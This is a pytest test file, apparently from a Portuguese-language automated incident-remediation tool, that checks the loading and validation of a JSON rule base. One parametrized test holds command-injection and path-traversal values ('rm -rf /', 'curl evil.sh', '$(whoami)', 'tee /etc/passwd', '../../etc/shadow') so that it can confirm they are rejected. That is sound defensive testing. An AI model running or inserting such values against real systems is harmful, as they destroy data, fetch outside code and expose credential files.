import json

import pytest

from src.engine.knowledge_base import KnowledgeBaseError, load
from src.engine.models import ParametroInvalidoError


def test_base_real_carrega_e_valida(kb):
    assert kb.versao_kb == "1.0.0"
    assert [r.id for r in kb.regras] == ["R001", "R002", "R003"]
    assert all(r.habilitada for r in kb.regras)


def test_ordem_de_declaracao_preservada(kb):
    assert [r.ordem for r in kb.regras] == [0, 1, 2]


def test_toda_regra_tem_verificador(kb):
    """Sem verificador não há como fechar o incidente com honestidade: exit code 0 não é prova."""
    assert all(r.remediacao.verificador for r in kb.regras)


def test_toda_regra_declara_pelo_menos_uma_condicao(kb):
    for r in kb.regras:
        assert r.condicao.regex_log or r.condicao.limiar_uso_pct is not None


def test_confianca_base_no_intervalo_valido(kb):
    assert all(0 < r.confianca_base <= 1 for r in kb.regras)


def _escrever(tmp_path, base):
    caminho = tmp_path / "rules.json"
    caminho.write_text(json.dumps(base, ensure_ascii=False), encoding="utf-8")
    return caminho


@pytest.fixture
def base_minima():
    return {
        "versao_kb": "1.0.0",
        "regras": [
            {
                "id": "R001",
                "nome": "Regra de teste",
                "condicao": {"tipo_alerta": "teste", "regex_log": ".*falhou.*"},
                "diagnostico": "Diagnóstico com tamanho suficiente para satisfazer o schema mínimo.",
                "remediacao": {
                    "comando": "true",
                    "rollback": "true",
                    "timeout_segundos": 10,
                },
                "confianca_base": 0.9,
            }
        ],
    }


def test_falha_com_campo_desconhecido(tmp_path, base_minima):
    base_minima["regras"][0]["confianca_bases"] = 0.5
    with pytest.raises(KnowledgeBaseError, match="inválido"):
        load(_escrever(tmp_path, base_minima))


def test_falha_sem_versao_kb(tmp_path, base_minima):
    del base_minima["versao_kb"]
    with pytest.raises(KnowledgeBaseError):
        load(_escrever(tmp_path, base_minima))


def test_falha_com_id_fora_do_padrao(tmp_path, base_minima):
    base_minima["regras"][0]["id"] = "REGRA-1"
    with pytest.raises(KnowledgeBaseError):
        load(_escrever(tmp_path, base_minima))


def test_falha_com_id_duplicado(tmp_path, base_minima):
    base_minima["regras"].append(dict(base_minima["regras"][0]))
    with pytest.raises(KnowledgeBaseError, match="duplicado"):
        load(_escrever(tmp_path, base_minima))


def test_falha_com_regex_invalido(tmp_path, base_minima):
    base_minima["regras"][0]["condicao"]["regex_log"] = "[nao-fecha"
    with pytest.raises(KnowledgeBaseError, match="regex_log inválido"):
        load(_escrever(tmp_path, base_minima))


def test_falha_com_condicao_vazia(tmp_path, base_minima):
    del base_minima["regras"][0]["condicao"]["regex_log"]
    with pytest.raises(KnowledgeBaseError):
        load(_escrever(tmp_path, base_minima))


def test_falha_com_placeholder_orfao(tmp_path, base_minima):
    """Placeholder sem parâmetro tem que estourar na carga, não na hora de remediar."""
    base_minima["regras"][0]["remediacao"]["comando"] = "systemctl restart {nome_servico}"
    with pytest.raises(KnowledgeBaseError, match="sem parâmetro correspondente"):
        load(_escrever(tmp_path, base_minima))


def test_falha_com_confianca_acima_de_um(tmp_path, base_minima):
    base_minima["regras"][0]["confianca_base"] = 1.5
    with pytest.raises(KnowledgeBaseError):
        load(_escrever(tmp_path, base_minima))


def test_falha_com_arquivo_inexistente(tmp_path):
    with pytest.raises(KnowledgeBaseError, match="não encontrada"):
        load(tmp_path / "nao_existe.json")


def test_falha_com_json_malformado(tmp_path):
    caminho = tmp_path / "rules.json"
    caminho.write_text("{ isso nao e json", encoding="utf-8")
    with pytest.raises(KnowledgeBaseError, match="não é JSON válido"):
        load(caminho)


@pytest.mark.parametrize(
    "valor,erro",
    [
        ("nginx; rm -rf /", "não permitido"),
        ("nginx && curl evil.sh", "não permitido"),
        ("$(whoami)", "não permitido"),
        ("nginx\nsystemctl stop sshd", "não permitido"),
        ("`id`", "não permitido"),
        ("nginx|tee /etc/passwd", "não permitido"),
        ("../../etc/shadow", "travessia de diretório"),
    ],
)
def test_parametro_perigoso_e_rejeitado(kb, valor, erro):
    """Injeção via parâmetro: barrada pela allowlist mesmo se passasse pelo schema."""
    regra = kb.por_id("R003")
    original = regra.condicao.parametros["nome_servico"]
    regra.condicao.parametros["nome_servico"] = valor
    try:
        with pytest.raises(ParametroInvalidoError, match=erro):
            regra.render(regra.remediacao.comando)
    finally:
        regra.condicao.parametros["nome_servico"] = original


def test_caminho_absoluto_e_parametro_valido(kb):
    regra = kb.por_id("R001")
    assert regra.render(regra.remediacao.comando) == "disk_cleanup.sh /mnt/polaris_test"
